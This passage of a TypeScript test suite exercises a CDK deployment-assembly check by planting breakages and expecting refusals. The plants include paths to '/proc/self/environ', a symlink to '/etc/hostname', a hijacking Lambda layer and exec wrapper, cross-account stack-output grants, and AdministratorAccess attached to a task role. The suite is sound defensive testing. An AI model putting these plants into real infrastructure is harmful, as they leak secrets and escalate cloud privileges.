  // bootstrap version from the parameter the artifact names with the deploy role and prints its value
  // when it isn't a number, and hands CloudFormation the artifact's notification topics, tags and
  // parameters. So each stack's and asset manifest's are exactly the synth's.
  it('holds each stack’s and asset manifest’s deploy facts to the synth’s (COMMANDS-A2-02)', () => {
    const stacksOf =
      (change: (artifact: Artifact & { environment?: string }) => void, part?: string) => (dir: string) =>
        edit(join(prod(dir), 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (
              artifact.type === 'aws:cloudformation:stack' &&
              (part === undefined || String(artifact.properties?.stackName).endsWith(`-${part}`))
            )
              change(artifact)
        })
    const property = (name: string, value: unknown, part?: string) =>
      stacksOf(artifact => {
        if (artifact.properties !== undefined) artifact.properties[name] = value
      }, part)
    for (const [plant, label] of [
      [
        stacksOf(artifact => {
          if (artifact.properties !== undefined) delete artifact.properties.terminationProtection
        }, 'Platform'),
        'Platform unprotected',
      ],
      [property('terminationProtection', false, 'Data'), 'Data unprotected'],
      [property('terminationProtection', true, 'Services'), 'Services protected'],
      [property('bootstrapStackVersionSsmParameter', '/hearth/organisation/id', 'Services'), 'another parameter'],
      [property('requiresBootstrapStackVersion', 1), 'another version'],
      [property('notificationArns', ['x'], 'Services'), 'a topic'],
      [property('tags', { x: 'y' }, 'Services'), 'a tag'],
      [property('parameters', { X: 'y' }), 'a parameter'],
      [property('assumeRoleExternalId', 'x'), 'an external id'],
      [property('validateOnSynth', true), 'validated on synth'],
      [
        stacksOf(artifact => {
          const role = artifact.properties?.lookupRole as Record<string, unknown> | undefined
          if (role !== undefined) role.bootstrapStackVersionSsmParameter = '/hearth/organisation/id'
        }),
        "the lookup role's parameter",
      ],
      [
        stacksOf(artifact => {
          if (artifact.properties !== undefined)
            artifact.properties.assumeRoleArn = String(artifact.properties.assumeRoleArn).replace('deploy', 'lookup')
        }),
        'another deploy role',
      ],
      [
        stacksOf(artifact => {
          artifact.environment = 'aws://unknown-account/us-east-1'
        }),
        'another region',
      ],
      [
        (dir: string) =>
          edit(join(nonprod(dir), 'manifest.json'), json => {
            for (const artifact of Object.values(artifacts(json)))
              if (artifact.type === 'cdk:asset-manifest' && artifact.properties !== undefined)
                artifact.properties.bootstrapStackVersionSsmParameter = '/hearth/organisation/id'
          }),
        "an asset manifest's parameter",
      ],
      [
        (dir: string) =>
          edit(join(nonprod(dir), 'manifest.json'), json => {
            for (const artifact of Object.values(artifacts(json)))
              if (artifact.type === 'cdk:asset-manifest' && artifact.properties !== undefined)
                artifact.properties.assumeRoleExternalId = 'x'
          }),
        "an asset manifest's property of its own",
      ],
    ] as const) {
      expect(check(plant), label).toBe(FACTS)
    }
  }, 120_000)

  it('refuses each planted breakage of the manifests, the files they name and the tree', () => {
    const inManifest =
      (folder: (dir: string) => string, change: (json: Record<string, unknown>) => void) => (dir: string) =>
        edit(join(folder(dir), 'manifest.json'), change)
    const each = (type: string, change: (artifact: Artifact) => void) => (json: Record<string, unknown>) => {
      for (const artifact of Object.values(artifacts(json))) if (artifact.type === type) change(artifact)
    }
    expect(
      check(
        inManifest(
          nonprod,
          each('cdk:asset-manifest', artifact => ((artifact.properties ?? {}).file = '../x.assets.json')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(
        inManifest(
          nonprod,
          each('aws:cloudformation:stack', artifact => ((artifact.properties ?? {}).templateFile = '../t.json')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(
        inManifest(
          d => d,
          each('cdk:cloud-assembly', artifact => ((artifact.properties ?? {}).directoryName = 'a/b')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(
        inManifest(
          d => d,
          each('cdk:tree', artifact => ((artifact.properties ?? {}).file = '/proc/self/environ')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(inManifest(prod, json => (json.missing = [{ key: 'x', provider: 'availability-zones', props: {} }]))),
    ).toBe(refused('a manifest has missing context, which the CLI would look up'))
    expect(
      check(
        inManifest(
          d => d,
          json => (artifacts(json).p = { type: 'cdk:plugin' }),
        ),
      ),
    ).toBe(refused('an artifact type is not one a workload synth writes'))
    // Before the manifest's other artifacts too, since jq -e reads its program's last value alone.
    expect(
      check(
        inManifest(
          d => d,
          json => (json.artifacts = { p: { type: 'cdk:plugin' }, ...artifacts(json) }),
        ),
      ),
    ).toBe(refused('an artifact type is not one a workload synth writes'))
    // A field of a type a rule doesn't expect makes jq fail on it, and jq's error, which names the file and
    // starts the value, stays out of the log: the refusal is the one line (each value would show in it).
    expect(
      check(
        inManifest(
          d => d,
          json => (json.artifacts = 'VALUE-1234567'),
        ),
      ),
    ).toBe(refused('an artifact type is not one a workload synth writes'))
    expect(check(inManifest(prod, json => (json.missing = true)))).toBe(
      refused('a manifest has missing context, which the CLI would look up'),
    )
    expect(
      check(dir => edit(named(nonprod(dir), 'Platform', '.assets.json'), json => (json.files = 'VALUE-1234567'))),
    ).toBe(RUNS)
    expect(
      check(dir => edit(named(nonprod(dir), 'Platform', '.assets.json'), json => (json.dockerImages = true))),
    ).toBe(refused('an asset manifest holds a container image asset'))
    expect(check(dir => symlinkSync('/etc/hostname', join(prod(dir), 'link')))).toBe(
      refused('the assembly holds a symbolic link'),
    )
  }, 30_000)

  it('refuses a legacy asset entry anywhere the CLI reads metadata, and a metadata file it can’t read', () => {
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Services', '.metadata.json'), json => (json['/nonprod/Services'] = [ENTRY])),
      ),
    ).toBe(LEGACY)
    expect(
      check(dir =>
        edit(join(dir, 'manifest.json'), json => {
          const artifact = artifacts(json)['assembly-nonprod']
          if (artifact !== undefined) artifact.metadata = { '/': [ENTRY] }
        }),
      ),
    ).toBe(LEGACY)
    expect(
      check(dir =>
        edit(join(dir, 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (artifact.type === 'cdk:tree') artifact.additionalMetadataFile = '/proc/self/environ'
        }),
      ),
    ).toBe(PLAIN)
    expect(check(dir => rmSync(named(nonprod(dir), 'Data', '.metadata.json')))).toBe(
      refused('a metadata file is missing'),
    )
    expect(check(dir => writeFileSync(named(nonprod(dir), 'Data', '.metadata.json'), '[]'))).toBe(
      refused('a metadata file is not a JSON object of entry lists'),
    )
  }, 30_000)

  // Round 11: the metadata types are an allowlist, the synth's own and the CLI's three annotations, which it
  // only prints or refuses on. aws-cdk 2.1100.0, an official CLI infra's pin could name, read stack tags from an
  // artifact's metadata and handed them to CloudFormation for every resource of the stack, in no template or
  // diff; the pinned CLI no longer reads them, so the refusal can't rest on which CLI runs.
  it('refuses stack tags and any other metadata type the synth never writes, inline or in a metadata file (round 11)', () => {
    const TAGS = { type: 'aws:cdk:stack-tags', data: [{ key: 'hearth-role', value: 'migrate' }] }
    const added = (entry: Record<string, unknown>) => (json: Record<string, unknown>) => {
      const key = '/nonprod/Services'
      json[key] = [...((json[key] as unknown[] | undefined) ?? []), entry]
    }
    expect(check(dir => edit(named(nonprod(dir), 'Services', '.metadata.json'), added(TAGS)))).toBe(LEGACY)
    // Before the list's own entries and before the file's other lists, since jq -e reads its program's last
    // value alone.
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Services', '.metadata.json'), json => {
          const key = '/nonprod/Services'
          const own = (json[key] as unknown[] | undefined) ?? []
          expect(own.length).toBeGreaterThan(0)
          const rest = Object.fromEntries(Object.entries(json).filter(([each]) => each !== key))
          for (const each of Object.keys(json)) delete json[each]
          Object.assign(json, { [key]: [TAGS, ...own] }, rest)
        }),
      ),
    ).toBe(LEGACY)
    expect(
      check(dir =>
        edit(join(prod(dir), 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (
              artifact.type === 'aws:cloudformation:stack' &&
              String(artifact.properties?.stackName).endsWith('-Services')
            )
              artifact.metadata = { ...((artifact.metadata as object | undefined) ?? {}), '/prod/Services': [TAGS] }
        }),
      ),
    ).toBe(LEGACY)
    for (const type of ['aws:cdk:do-not-refactor', 'aws:cdk:asset ', 'AWS:CDK:LOGICALID'])
      expect(
        check(dir => edit(named(nonprod(dir), 'Data', '.metadata.json'), added({ type, data: true }))),
        type,
      ).toBe(LEGACY)
    // The CLI's annotations pass: it prints a warning or note, and refuses to deploy a stack with an error.
    for (const type of ['aws:cdk:info', 'aws:cdk:warning', 'aws:cdk:error'])
      expect(
        check(dir => edit(named(nonprod(dir), 'Data', '.metadata.json'), added({ type, data: 'a note' }))),
        type,
      ).toBe('passed')
  }, 30_000)

  it('refuses an assembly built for another release', () => {
    const other = `${'e'.repeat(40)}:sha256:${'0'.repeat(64)}`
    expect(
      check(dir => {
        edit(named(prod(dir), 'Services', '.template.json'), json => {
          const outputs = json.Outputs as Record<string, { Value: unknown }>
          if (outputs.Release !== undefined) outputs.Release.Value = other
        })
        rekey(prod(dir), 'Services')
      }),
    ).toBe(refused("a Services template's Release is not this job's release"))
    expect(
      check(dir => {
        const template = named(prod(dir), 'Tasks', '.template.json')
        writeFileSync(
          template,
          readFileSync(template, 'utf8').replaceAll(
            `hearth-server@sha256:${'0'.repeat(64)}`,
            `hearth-server@sha256:${'1'.repeat(64)}`,
          ),
        )
        rekey(prod(dir), 'Tasks')
      }),
    ).toBe(refused('a container image is not the server image at this release'))
    expect(check(() => {}, other)).toBe(refused("a Services template's Release is not this job's release"))
    expect(check(() => {}, 'x')).toBe(refused('the release is not <commit>:<digest>'))
  }, 30_000)

  // INPUTS-A1-01 (round 9). ASSET_CHECK admitted CDK's Custom::VpcRestrictDefaultSG by its type alone, so a
  // release could add a second one whose ServiceToken named a function it added with inline code, or another
  // account's, and grant the api task whatever that handler answered, through Fn::GetAtt of the answer, which
  // the approver's diff shows only by the attribute's name. The one custom resource is now held to CDK's own:
  // it and its function, one of each or neither, in a Platform stack alone, its ServiceToken that function's
  // Arn, the function's code a zip in the staging bucket, and no string in its template naming it.
  it("holds the one custom resource to CDK's default security group handler, and nothing reads its answer (INPUTS-A1-01, round 9)", () => {
    const CUSTOM = refused(
      "a custom resource isn't CDK's one default security group handler, run by its own function as its own unnamed role trusted by Lambda alone, as CDK writes it, from the staging bucket in a Platform stack alone, or a value in its template reads its answer",
    )
    type Resource = { Type?: string; Properties?: Record<string, unknown> }
    const resources = (json: Record<string, unknown>) => (json.Resources ?? {}) as Record<string, Resource>
    const idOf = (json: Record<string, unknown>, type: string) => {
      const id = Object.keys(resources(json)).find(each => resources(json)[each]?.Type === type)
      if (id === undefined) throw new Error(`no ${type} in the template`)
      return id
    }
    // The real Platform template holds CDK's one custom resource and its function, and every other holds none.
    const platform = read(named(nonprod(source), 'Platform', '.template.json'))
    const CR = idOf(platform, 'Custom::VpcRestrictDefaultSG')
    const FN = idOf(platform, 'AWS::Lambda::Function')
    expect(resources(platform)[CR]?.Properties?.ServiceToken).toEqual({ 'Fn::GetAtt': [FN, 'Arn'] })
    // A template of the stage's edited and re-keyed, so the check reaches this rule.
    const inTemplate = (part: string, change: (json: Record<string, unknown>) => void) => (dir: string) => {
      edit(named(nonprod(dir), part, '.template.json'), change)
      rekey(nonprod(dir), part)
    }
    const grant = (id: string) => ({
      PolicyName: 'logs',
      PolicyDocument: {
        Version: '2012-10-17',
        Statement: [
          { Effect: 'Allow', Action: { 'Fn::GetAtt': [id, 'Action'] }, Resource: { 'Fn::GetAtt': [id, 'Resource'] } },
        ],
      },
    })
    const anotherAccount = ['arn', 'aws', 'lambda', 'ap-southeast-1', '1'.repeat(12), 'function', 'x'].join(':')
    expect(check(inTemplate('Platform', () => {}))).toBe('passed')
    // A second custom resource, run by a function the release adds with inline code (the attack's plant).
    expect(
      check(
        inTemplate('Platform', json => {
          const all = resources(json)
          all.Handler2 = { Type: 'AWS::Lambda::Function', Properties: { Code: { ZipFile: 'x' }, Handler: 'index.h' } }
          all.Custom2 = {
            Type: 'Custom::VpcRestrictDefaultSG',
            Properties: { ServiceToken: { 'Fn::GetAtt': ['Handler2', 'Arn'] } },
          }
        }),
      ),
    ).toBe(CUSTOM)
    // The one custom resource run by another account's function, or by its own with inline code or code from
    // another bucket or key.
    const ownCode = (change: (code: Record<string, unknown>) => void) =>
      inTemplate('Platform', json => {
        const code = resources(json)[FN]?.Properties?.Code as Record<string, unknown>
        change(code)
      })
    for (const plant of [
      inTemplate('Platform', json => {
        const properties = resources(json)[CR]?.Properties
        if (properties !== undefined) properties.ServiceToken = anotherAccount
      }),
      ownCode(code => {
        for (const key of Object.keys(code)) delete code[key]
        code.ZipFile = 'x'
      }),
      ownCode(code => (code.S3Bucket = 'another-bucket')),
      ownCode(code => (code.S3Key = 'x.zip')),
      ownCode(code => (code.ZipFile = 'x')),
    ]) {
      expect(check(plant)).toBe(CUSTOM)
    }
    // Anything that reads its answer: a role's grant, an output, a dependency, even a string that names it.
    for (const plant of [
      inTemplate('Platform', json => {
        const role = idOf(json, 'AWS::IAM::Role')
        const properties = resources(json)[role]?.Properties
        if (properties !== undefined) properties.Policies = [grant(CR)]
      }),
      inTemplate('Platform', json => {
        json.Outputs = { ...(json.Outputs as object), Answer: { Value: { 'Fn::GetAtt': [CR, 'Resource'] } } }
      }),
      inTemplate('Platform', json => {
        const role = idOf(json, 'AWS::IAM::Role')
        const all = resources(json) as Record<string, Record<string, unknown>>
        if (all[role] !== undefined) all[role].DependsOn = [CR]
      }),
    ]) {
      expect(check(plant)).toBe(CUSTOM)
    }
    // A custom resource and its function in any other stack.
    expect(
      check(
        inTemplate('Data', json => {
          const all = resources(json)
          all[FN] = structuredClone(resources(platform)[FN] ?? {})
          all[CR] = structuredClone(resources(platform)[CR] ?? {})
        }),
      ),
    ).toBe(CUSTOM)
    // Neither, the custom resource, its function and the function's role all gone, passes.
    expect(
      check(
        inTemplate('Platform', json => {
          const role = (resources(json)[FN]?.Properties?.Role as { 'Fn::GetAtt'?: string[] } | undefined)?.[
            'Fn::GetAtt'
          ]?.[0]
          delete resources(json)[CR]
          delete resources(json)[FN]
          if (role !== undefined) delete resources(json)[role]
        }),
      ),
    ).toBe('passed')
  }, 60_000)

  // INPUTS-A2-01 (round 9). The custom resource's rule held its handler function's Code and the ServiceToken but
  // no other property, so a release gave CDK's own handler aws-cdk-lib's documented observability idiom, another
  // account's layer and AWS_LAMBDA_EXEC_WRAPPER naming that layer's startup script, and the code that ran when
  // CloudFormation called the handler was another account's; the approver's diff showed two added properties,
  // the layer's account masked as ***. The function's properties are now CDK's own and no others.
  it("holds the default security group handler's function to CDK's own properties (INPUTS-A2-01, round 9)", () => {
    const CUSTOM = refused(
      "a custom resource isn't CDK's one default security group handler, run by its own function as its own unnamed role trusted by Lambda alone, as CDK writes it, from the staging bucket in a Platform stack alone, or a value in its template reads its answer",
    )
    type Resource = { Type?: string; Properties?: Record<string, unknown> }
    const resources = (json: Record<string, unknown>) => (json.Resources ?? {}) as Record<string, Resource>
    const platform = read(named(nonprod(source), 'Platform', '.template.json'))
    const FN = Object.keys(resources(platform)).find(id => resources(platform)[id]?.Type === 'AWS::Lambda::Function')
    if (FN === undefined) throw new Error('no handler function in the Platform template')
    // The synth's function holds exactly these properties.
    expect(Object.keys(resources(platform)[FN]?.Properties ?? {}).sort()).toEqual([
      'Code',
      'Description',
      'Handler',
      'MemorySize',
      'Role',
      'Runtime',
      'Timeout',
    ])
    const fn = (change: (properties: Record<string, unknown>) => void) => (dir: string) => {
      edit(named(nonprod(dir), 'Platform', '.template.json'), json => {
        const properties = resources(json)[FN]?.Properties
        if (properties === undefined) throw new Error('no handler properties')
        change(properties)
      })
      rekey(nonprod(dir), 'Platform')
    }
    expect(check(fn(() => {}))).toBe('passed')
    // Another account's layer, built from parts so no account id is written here.
    const layer = ['arn', 'aws', 'lambda', 'ap-southeast-1', '1'.repeat(12), 'layer', 'x', '7'].join(':')
    const wrapper = { Variables: { AWS_LAMBDA_EXEC_WRAPPER: '/opt/otel-instrument' } }
    const role = ['arn', 'aws', 'iam', '', '1'.repeat(12), 'role/x'].join(':')
    for (const [name, change] of [
      // The attack's plant: a layer and the wrapper that runs its script first.
      [
        'layer and wrapper',
        (properties: Record<string, unknown>) => {
          properties.Layers = [layer]
          properties.Environment = wrapper
        },
      ],
      ['layer alone', (properties: Record<string, unknown>) => (properties.Layers = [layer])],
      ['environment alone', (properties: Record<string, unknown>) => (properties.Environment = wrapper)],
      [
        'a custom runtime',
        (properties: Record<string, unknown>) => {
          properties.Runtime = 'provided.al2023'
          properties.Handler = 'bootstrap'
        },
      ],
      ['another handler', (properties: Record<string, unknown>) => (properties.Handler = 'index.handler')],
      [
        'a network of its own',
        (properties: Record<string, unknown>) => (properties.VpcConfig = { SubnetIds: [], SecurityGroupIds: [] }),
      ],
      ['a role elsewhere', (properties: Record<string, unknown>) => (properties.Role = role)],
      [
        "a role that isn't one of its template's",
        (properties: Record<string, unknown>) => (properties.Role = { 'Fn::GetAtt': ['Nothing', 'Arn'] }),
      ],
      ['no description', (properties: Record<string, unknown>) => delete properties.Description],
    ] as const) {
      expect(check(fn(change)), name).toBe(CUSTOM)
    }
  }, 120_000)

  // INPUTS-A3-01 (round 9, attack 3). The check held sections, transforms, types, parameters and braces but no
  // intrinsic function, so a release gave prod's api task role an inline policy whose Action and Resource were
  // Fn::GetStackOutput reads of a stack in another account, through that account's role: aws-cdk-lib's own
  // cross-stack form, which IAC-13 refuses only over CI's synth. CloudFormation reads such an output when the stack
  // deploys, and the approver's diff showed a reference whose account the step's mask writes ***. A template now
  // calls only the intrinsic functions the workload's templates write, each in its own section, and no output
  // exports a value.
  it('holds every template to the intrinsic functions the workload writes, and no output exports (INPUTS-A3-01, round 9)', () => {
    const CALLS = refused(
      "a template calls an intrinsic function a workload synth never writes, another stack's output among them, which CloudFormation reads when the stack deploys and the diff never shows, or exports an output",
    )
    type Resource = { Type?: string; Properties?: Record<string, unknown> }
    const resources = (json: Record<string, unknown>) => (json.Resources ?? {}) as Record<string, Resource>
    const outputs = (json: Record<string, unknown>) => (json.Outputs ?? {}) as Record<string, Record<string, unknown>>
    const first = (json: Record<string, unknown>, prefix: string, type: string) => {
      const id = Object.keys(resources(json)).find(
        each => each.startsWith(prefix) && resources(json)[each]?.Type === type,
      )
      if (id === undefined) throw new Error(`no ${prefix} ${type}`)
      return id
    }
    const inTemplate = (part: string, change: (json: Record<string, unknown>) => void) => (dir: string) => {
      edit(named(prod(dir), part, '.template.json'), change)
      rekey(prod(dir), part)
    }
    // Another account's stack and role, built from parts so no account id is written here.
    const account = '1'.repeat(12)
    const stack = ['arn', 'aws', 'cloudformation', 'ap-southeast-1', account, 'stack/grants/x'].join(':')
    const reader = ['arn', 'aws', 'iam', '', account, 'role/grants-reader'].join(':')
    const output = (name: string, role = true) => ({
      'Fn::GetStackOutput': {
        StackName: stack,
        OutputName: name,
        Region: 'ap-southeast-1',
        ...(role ? { RoleArn: reader } : {}),
      },
    })
    const apiRole = (change: (properties: Record<string, unknown>) => void) =>
      inTemplate('Platform', json => {
        const properties = resources(json)[first(json, 'RolesApiTask', 'AWS::IAM::Role')]?.Properties
        if (properties === undefined) throw new Error('no api task role')
        change(properties)
      })
    const apiEnvironment = (value: unknown) =>
      inTemplate('Services', json => {
        const definitions = resources(json)[first(json, 'ApiTask', 'AWS::ECS::TaskDefinition')]?.Properties
          ?.ContainerDefinitions as Array<{ Environment: unknown[] }>
        definitions[0]?.Environment.push({ Name: 'NODE_OPTIONS', Value: value })
      })
    // The re-keyed synth passes, so each refusal below is its plant's: the five the resources and outputs write
    // and the two CDK's bootstrap version rule writes, each in its own section.
    expect(check(inTemplate('Platform', () => {}))).toBe('passed')
    // (In an output, past this rule and refused only by the outputs' own hold, which no output the synth never
    // writes gets past since round 10's first attack: a container's environment holds no function now.)
    expect(
      check(
        inTemplate('Services', json => {
          outputs(json).Zone = { Value: { 'Fn::Select': [0, { 'Fn::GetAZs': '' }] } }
        }),
      ),
      'the functions the resources write',
    ).toBe(
      refused(
        "a stack's outputs aren't the workload's: an output the workload synth never writes for its stack, or a value of another shape, which the one-offs, the release checks and the read-back would read",
      ),
    )
    for (const [name, plant] of [
      // The attack's own plant: an inline policy on prod's api task role whose grant another account decides.
      [
        "another account's stack output granting the api task role",
        apiRole(properties => {
          properties.Policies = [
            {
              PolicyName: 'observability',
              PolicyDocument: {
                Version: '2012-10-17',
                Statement: [{ Effect: 'Allow', Action: output('Action'), Resource: output('Resource') }],
              },
            },
          ]
        }),
      ],
      ["another account's stack output in the api's NODE_OPTIONS", apiEnvironment(output('NodeOptions'))],
      ["another stack's output with no role", apiEnvironment(output('NodeOptions', false))],
      [
        "the Tasks output that decides whether migrate runs, from another stack's output",
        inTemplate('Tasks', json => {
          const has = outputs(json).HasDatabase
          if (has === undefined) throw new Error('no HasDatabase output')
          has.Value = output('HasDatabase', false)
        }),
      ],
      ['an imported value', apiEnvironment({ 'Fn::ImportValue': 'observability-node-options' })],
      ['an imported value in another letter case', apiEnvironment({ 'fn::importvalue': 'x' })],
      ['a function AWS could add', apiEnvironment({ 'Fn::Base64': 'x' })],
      ["a rule's function in a resource", apiEnvironment({ 'Fn::Not': [{ 'Fn::Equals': ['a', 'b'] }] })],
      [
        "a resource's function in a rule",
        inTemplate('Platform', json => {
          json.Rules = { X: { Assertions: [{ Assert: { 'Fn::Sub': 'x' } }] } }
        }),
      ],
      [
        'an export',
        inTemplate('Tasks', json => {
          const cluster = outputs(json).Cluster
          if (cluster === undefined) throw new Error('no Cluster output')
          cluster.Export = { Name: 'hearth-cluster' }
        }),
      ],
      [
        'an output under a condition',
        inTemplate('Tasks', json => {
          const cluster = outputs(json).Cluster
          if (cluster === undefined) throw new Error('no Cluster output')
          cluster.Condition = 'X'
        }),
      ],
    ] as const) {
      expect(check(plant), name).toBe(CALLS)
    }
  }, 120_000)

  // INPUTS-A4-01 (round 9). A role can attach a managed policy by its ARN (ManagedPolicyArns), which the diff
  // lists by that ARN alone and never prints the statements of: a release that attached the account's own
  // hearth-boundary, whose first statement allows everything, to prod's api task role passed every check. Every
  // role now holds only the keys the workload writes and the account's own boundary as the synth spells it.
  it('holds every role to the keys the workload writes and the account’s own boundary (INPUTS-A4-01, round 9)', () => {
    const ROLES = refused(
      "a role holds a key a workload synth never writes, a managed policy attached by its ARN among them, whose grant the diff never prints, a boundary but the account's own, or two inline policies of one name, of which IAM keeps one while the diff shows both",
    )
    type Resource = { Type?: string; Properties?: Record<string, unknown> }
    const resources = (json: Record<string, unknown>) => (json.Resources ?? {}) as Record<string, Resource>
    const apiRole = (change: (properties: Record<string, unknown>) => void) => (dir: string) => {
      edit(named(prod(dir), 'Platform', '.template.json'), json => {
        const id = Object.keys(resources(json)).find(
          each => each.startsWith('RolesApiTask') && resources(json)[each]?.Type === 'AWS::IAM::Role',
        )
        const properties = id === undefined ? undefined : resources(json)[id]?.Properties
        if (properties === undefined) throw new Error('no api task role')
        change(properties)
      })
      rekey(prod(dir), 'Platform')
    }
    // The account's boundary as applyBoundary() renders it, and the same policy written other ways, each built
    // from parts so no account id or ARN is written here.
    const boundary = {
      'Fn::Join': ['', [['arn', 'aws', 'iam', '', ''].join(':'), { Ref: 'AWS::AccountId' }, ':policy/hearth-boundary']],
    }
    const byPartition = {
      'Fn::Join': [
        '',
        ['arn:', { Ref: 'AWS::Partition' }, ':iam::', { Ref: 'AWS::AccountId' }, ':policy/hearth-boundary'],
      ],
    }
    const literal = ['arn', 'aws', 'iam', '', '1'.repeat(12), 'policy/hearth-boundary'].join(':')
    const administrator = ['arn', 'aws', 'iam', '', 'aws', 'policy/AdministratorAccess'].join(':')
    // The re-keyed synth passes, and so does a role whose properties are only re-written as they were.
    expect(check(apiRole(() => {}))).toBe('passed')
    expect(
      check(
        apiRole(properties => {
          properties.PermissionsBoundary = boundary
        }),
      ),
    ).toBe('passed')
    for (const [name, plant] of [
      // The attack's own plant: the account's boundary attached as a policy, as the release wrote it.
      [
        'the boundary attached by a Join',
        apiRole(properties => {
          properties.ManagedPolicyArns = [byPartition]
        }),
      ],
      [
        'the boundary attached by a literal ARN',
        apiRole(properties => {
          properties.ManagedPolicyArns = [literal]
        }),
      ],
      [
        "AWS's AdministratorAccess attached",
        apiRole(properties => {
          properties.ManagedPolicyArns = [administrator]
        }),
      ],
      [
        'an empty attachment list',
        apiRole(properties => {
          properties.ManagedPolicyArns = []
        }),
      ],
      [
        'another key a release adds',
        apiRole(properties => {
          properties.Path = '/hearth/'
        }),
      ],
      [
        'a boundary but the account’s own',
        apiRole(properties => {
          properties.PermissionsBoundary = administrator
        }),
      ],
      [
        'the boundary spelt with the partition',
        apiRole(properties => {
          properties.PermissionsBoundary = byPartition
        }),
      ],
      [
        'no boundary',
        apiRole(properties => {
          delete properties.PermissionsBoundary
        }),
      ],
    ] as const) {
      expect(check(plant), name).toBe(ROLES)
    }
  }, 120_000)

  it('holds the probe’s and migrate’s line patterns to what they print', () => {
    const probe = new RegExp(PROBE_LINES)
    for (const line of ['api 0 200 -', 'realtime 1 no-answer ?', 'worker 0 503 valkey,database', 'probe: failed'])
      expect(probe.test(line), line).toBe(true)
    for (const line of [`api 0 200 ${[10, 0, 0, 1].join('.')}`, 'api 0 200', 'probe: failed at x'])
      expect(probe.test(line), line).toBe(false)
    const migrate = new RegExp(MIGRATE_LINES)
    for (const line of [
      'migrate: applied 0015_x',
      'migrate: nothing to apply',
      'migrate: nothing was applied; the batch rolled back',
    ]) {
      expect(migrate.test(line), line).toBe(true)
    }
    expect(migrate.test('migrate: failed 0015_x: password authentication failed')).toBe(false)
  })

  // The tenth review's hardening. Rounds 7 to 9 each found the next resource property through which a release's
  // own render (code off the owner's-read list, rendered only for a real release, so CI's assertion tests over the
  // fake release never see it) handed CloudFormation, ECS, ELB or another service a value or a grant the
  // approver's diff shows as one line, or in non-prod, which deploys with no approver, nowhere. So ASSET_CHECK now
  // holds every resource to the keys and forms the workload synth writes for its type, every value that can
  // reach outside the template to the account's own ARNs and the stack's own stage, and each value a service
  // acts on to the synth's shape. Each plant below passed the check before (but the one whose earlier rule is
  // named), and each is refused by the rule named.
  const KEYS = refused(
    'a resource holds a key, or writes a property in a form, that a workload synth never writes for its type',
  )
  const NAMES = refused(
    "a template names something outside its stage: an ARN but its own account's, an account id, or a parameter or name of another stage",
  )
  const ECS = refused(
    "a task definition, service or cluster isn't the workload's: its roles, image, log group, secret, tags, network, target groups, ECS Exec, names or containers of another shape, or a Services stack's services other than api, realtime and worker, each on its own family",
  )
  const NETWORK = refused(
    "a network resource isn't the workload's: a security group rule, VPC endpoint or its policy, load balancer, target group, listener, record, route or flow log naming or opening something of another shape, or a flow log delivering as a role but its own unnamed one trusted by VPC flow logs alone; a listener other than HTTPS on 443 with a certificate; a subnet that gives a public address, or the restore stage holding an internet gateway, a route, a load balancer, a listener, a target group, a certificate, a record, a group open to any address or a service behind a load balancer",
  )
  const STORED = refused(
    "a parameter, secret, log group, role, cache or tag isn't the workload's: a name, a stored value, a role's trust (a named role's ECS tasks' alone) or a task role's network perimeter of another shape",
  )
  const OWN_ROLE = refused(
    "a role holds a key a workload synth never writes, a managed policy attached by its ARN among them, whose grant the diff never prints, a boundary but the account's own, or two inline policies of one name, of which IAM keeps one while the diff shows both",
  )
  const HANDLER = refused(
    "a custom resource isn't CDK's one default security group handler, run by its own function as its own unnamed role trusted by Lambda alone, as CDK writes it, from the staging bucket in a Platform stack alone, or a value in its template reads its answer",
  )
  type Planted = { Type: string; Properties: Record<string, unknown>; [key: string]: unknown }
  type Container = Record<string, unknown> & { LogConfiguration: { Options: Record<string, unknown> } }
  // Another account, its ARNs and an organisation id, each built from parts so none is written here.
  const elsewhere = '1'.repeat(12)
  const arnOf = (service: string, region: string, account: string, rest: string) =>
    ['arn', 'aws', service, region, account, rest].join(':')
  const ownRole = (name: string) => ({
    'Fn::Join': ['', [['arn', 'aws', 'iam', '', ''].join(':'), { Ref: 'AWS::AccountId' }, `:role/${name}`]],
  })
  // Changes the first resource of a type in a stage's templates (or the first whose logical id starts with a
  // prefix), handing the change its template too, and re-keys that template as the synth would.
  const changed =
    (
      type: string,
      change: (resource: Planted, template: Record<string, unknown>) => void,
      prefix = '',
      stage: (dir: string) => string = nonprod,
    ) =>
    (dir: string) => {
      for (const part of ['Platform', 'Data', 'Tasks', 'Services']) {
        const path = named(stage(dir), part, '.template.json')
        const template = read(path)
        const resources = template.Resources as Record<string, Planted>
        const id = Object.keys(resources).find(key => resources[key]?.Type === type && key.startsWith(prefix))
        const resource = id === undefined ? undefined : resources[id]
        if (resource === undefined) continue
        change(resource, template)
        write(path, template)
        rekey(stage(dir), part)
        return
      }
      throw new Error(`no ${prefix}${type} in the stage`)
    }
  const firstContainer = (resource: Planted) =>
    (resource.Properties.ContainerDefinitions as Container[])[0] as Container
  // A parameter's logical id in a template, by the entry it names.
  const parameterFor = (template: Record<string, unknown>, entry: string) => {
    const parameters = template.Parameters as Record<string, { Default?: string }>
    const id = Object.keys(parameters).find(key => parameters[key]?.Default === entry)
    if (id === undefined) throw new Error(`no parameter for ${entry}`)
    return id
  }
  const TYPES = [
    'AWS::CertificateManager::Certificate',
    'AWS::EC2::FlowLog',
    'AWS::EC2::InternetGateway',
    'AWS::EC2::Route',
    'AWS::EC2::RouteTable',
    'AWS::EC2::SecurityGroup',
    'AWS::EC2::SecurityGroupEgress',
    'AWS::EC2::SecurityGroupIngress',
    'AWS::EC2::Subnet',
    'AWS::EC2::SubnetRouteTableAssociation',
    'AWS::EC2::VPC',
    'AWS::EC2::VPCEndpoint',
    'AWS::EC2::VPCGatewayAttachment',
    'AWS::ECS::Cluster',
    'AWS::ECS::Service',
    'AWS::ECS::TaskDefinition',
    'AWS::ElastiCache::ParameterGroup',
    'AWS::ElastiCache::ReplicationGroup',
    'AWS::ElastiCache::SubnetGroup',
    'AWS::ElasticLoadBalancingV2::Listener',
